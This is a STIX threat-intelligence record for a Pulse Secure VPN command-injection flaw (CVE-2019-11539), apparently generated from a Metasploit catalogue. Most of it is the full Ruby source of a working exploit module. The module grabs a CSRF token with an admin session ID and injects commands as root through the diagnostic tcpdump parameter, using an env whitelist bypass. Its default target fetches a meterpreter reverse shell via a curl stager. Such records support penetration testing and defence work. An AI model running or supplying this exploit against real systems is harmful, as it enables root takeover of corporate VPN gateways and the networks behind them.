{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3b072342-5560-4c32-9fc9-6f1dd1d9d8ac",
    "created": "2024-08-14T17:00:44.328455Z",
    "modified": "2024-08-14T17:00:44.328459Z",
    "name": "Pulse Secure VPN Arbitrary Command Execution",
    "description": " This module exploits a post-auth command injection in the Pulse Secure VPN server to execute commands as root. The env(1) command is used to bypass application whitelisting and run arbitrary commands.  Please see related module auxiliary/gather/pulse_secure_file_disclosure for a pre-auth file read that is able to obtain plaintext and hashed credentials, plus session IDs that may be used with this exploit.  A valid administrator session ID is required in lieu of untested SSRF. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/pulse_secure_cmd_exec.rb",
            "external_id": "pulse_secure_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-11539"
        },
        {
            "source_name": "reference",
            "url": "https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/"
        },
        {
            "source_name": "reference",
            "url": "https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html"
        },
        {
            "source_name": "reference",
            "url": "https://hackerone.com/reports/591295"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::CheckModule\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'               => 'Pulse Secure VPN Arbitrary Command Execution',\n      'Description'        => %q{\n        This module exploits a post-auth command injection in the Pulse Secure\n        VPN server to execute commands as root. The env(1) command is used to\n        bypass application whitelisting and run arbitrary commands.\n\n        Please see related module auxiliary/gather/pulse_secure_file_disclosure\n        for a pre-auth file read that is able to obtain plaintext and hashed\n        credentials, plus session IDs that may be used with this exploit.\n\n        A valid administrator session ID is required in lieu of untested SSRF.\n      },\n      'Author'             => [\n        'Orange Tsai', # Discovery (@orange_8361)\n        'Meh Chang',   # Discovery (@mehqq_)\n        'wvu'          # Module\n      ],\n      'References'         => [\n        ['CVE', '2019-11539'],\n        ['URL', 'https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/'],\n        ['URL', 'https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html'],\n        ['URL', 'https://hackerone.com/reports/591295']\n      ],\n      'DisclosureDate'     => '2019-04-24', # Public disclosure\n      'License'            => MSF_LICENSE,\n      'Platform'           => ['unix', 'linux'],\n      'Arch'               => [ARCH_CMD, ARCH_X86, ARCH_X64],\n      'Privileged'         => true,\n      'Targets'            => [\n        ['Unix In-Memory',\n          'Platform'       => 'unix',\n          'Arch'           => ARCH_CMD,\n          'Type'           => :unix_memory,\n          'Payload'        => {\n            'BadChars'     => %Q(&*(){}[]`;|?\\n~<>\"'),\n            'Encoder'      => 'generic/none' # Force manual badchar analysis\n          },\n          'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/generic'}\n        ],\n        ['Linux Dropper',\n          'Platform'       => 'linux',\n          'Arch'           => [ARCH_X86, ARCH_X64],\n          'Type'           => :linux_dropper,\n          'DefaultOptions' => {'PAYLOAD' => 'linux/x64/meterpreter_reverse_tcp'}\n        ]\n      ],\n      'DefaultTarget'      => 1,\n      'DefaultOptions'     => {\n        'RPORT'            => 443,\n        'SSL'              => true,\n        'CMDSTAGER::SSL'   => true,\n        'CheckModule'      => 'auxiliary/gather/pulse_secure_file_disclosure'\n      },\n      'Notes'              => {\n        'Stability'        => [CRASH_SAFE],\n        'Reliability'      => [REPEATABLE_SESSION],\n        'SideEffects'      => [IOC_IN_LOGS, ARTIFACTS_ON_DISK],\n        'RelatedModules'   => ['auxiliary/gather/pulse_secure_file_disclosure']\n      }\n    ))\n\n    register_options([\n      OptString.new('SID', [true, 'Valid admin session ID'])\n    ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def exploit\n    get_csrf_token\n\n    print_status(\"Executing #{target.name} target\")\n\n    case target['Type']\n    when :unix_memory\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager(\n        flavor:   :curl,\n        noconcat: true\n      )\n    end\n  end\n\n  def get_csrf_token\n    @cookie = \"DSID=#{datastore['SID']}\"\n    print_good(\"Setting session cookie: #{@cookie}\")\n\n    print_status('Obtaining CSRF token')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => diag_cgi,\n      'cookie' => @cookie\n    )\n\n    unless res && res.code == 200 && (@csrf_token = parse_csrf_token(res.body))\n      fail_with(Failure::NoAccess, 'Session cookie expired or invalid')\n    end\n\n    print_good(\"CSRF token: #{@csrf_token}\")\n  end\n\n  def parse_csrf_token(body)\n    body.to_s.scan(/xsauth=([[:xdigit:]]+)/).flatten.first\n  end\n\n  def execute_command(cmd, _opts = {})\n    # Prepend absolute path to curl(1), since it's not in $PATH\n    cmd.prepend('/home/bin/') if cmd.start_with?('curl')\n\n    # Bypass application whitelisting with permitted env(1)\n    cmd.prepend('env ')\n\n    vprint_status(\"Executing command: #{cmd}\")\n    print_status(\"Yeeting exploit at #{full_uri(diag_cgi)}\")\n    res = send_request_cgi(\n      'method'    => 'GET',\n      'uri'       => diag_cgi,\n      'cookie'    => @cookie,\n      'vars_get'  => {\n        'a'       => 'td', # tcpdump\n        'options' => sploit(cmd),\n        'xsauth'  => @csrf_token,\n        'toggle'  => 'Start Sniffing'\n      }\n    )\n\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, 'Could not yeet exploit')\n    end\n\n    print_status(\"Triggering payload at #{full_uri(setcookie_cgi)}\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => setcookie_cgi\n    }, 3.1337)\n\n    # 200 response code, yet 500 error in body\n    unless res && res.code == 200 && !res.body.include?('500 Internal Error')\n      print_warning('Payload execution may have failed')\n      return\n    end\n\n    print_good('Payload execution successful')\n\n    if datastore['PAYLOAD'] == 'cmd/unix/generic'\n      print_line(res.body.sub(/\\s*<html>.*/m, ''))\n    end\n  end\n\n  def sploit(cmd)\n    %(-r$x=\"#{cmd}\",system$x# 2>/data/runtime/tmp/tt/setcookie.thtml.ttc <)\n  end\n\n  def diag_cgi\n    '/dana-admin/diag/diag.cgi'\n  end\n\n  def setcookie_cgi\n    '/dana-na/auth/setcookie.cgi'\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-04-24, # Public disclosure",
    "x_mitre_platforms": [
        "linux'"
    ]
}